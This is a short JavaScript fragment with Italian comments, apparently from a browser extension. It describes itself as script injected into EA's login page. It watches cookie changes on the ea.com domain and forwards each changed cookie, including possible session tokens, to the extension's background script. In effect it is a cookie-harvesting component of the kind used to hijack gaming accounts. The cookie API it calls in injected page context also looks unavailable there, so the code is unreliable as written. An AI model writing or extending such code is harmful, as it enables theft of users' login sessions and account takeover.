// Iniezione di script nella pagina di login di EA per monitorare gli eventi di accesso
(function() {
  // Funzione per inviare i dettagli dell'accesso al background script
  function sendLoginDetailsToBackground(cookie) {
    chrome.runtime.sendMessage({ action: "loginDetected", cookie: cookie });
  }

  // Monitora gli eventi di accesso sulla pagina di login di EA
  chrome.cookies.onChanged.addListener(function(changeInfo) {
    if (changeInfo.cause === "explicit" && changeInfo.cookie.domain === "ea.com") {
      sendLoginDetailsToBackground(changeInfo.cookie);
    }
  });
})();
